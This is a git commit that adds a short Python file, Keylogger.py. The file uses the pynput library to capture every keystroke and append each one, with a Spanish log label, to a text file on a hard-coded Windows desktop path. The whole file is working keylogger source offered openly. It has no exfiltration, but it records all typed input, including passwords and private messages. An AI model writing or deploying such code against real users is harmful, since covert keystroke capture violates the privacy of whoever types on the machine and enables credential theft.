aa145f5c4bc9d496f484f6e61da8fdd9adb04b41
Cyb3rPh4nt0n <cyb3rph4t0n@gmail.com>
2025-06-04 20:36:03 +0200

    Add files via upload

---
+++ Keylogger.py
@@ -0,0 +1,16 @@
+#Keylogger.py
+
+
+from pynput import keyboard as kb
+
+lista_keylogger_pulsar=list()
+
+
+def detect_k(key):
+  archivo = open(r"C:\Users\grego\Desktop\Keylogger.txt", "a")
+  
+  archivo.write(f"[+] Tecla pulsada -> {str(key)}\n")
+  archivo.close()
+  
+
+kb.Listener(detect_k).run()
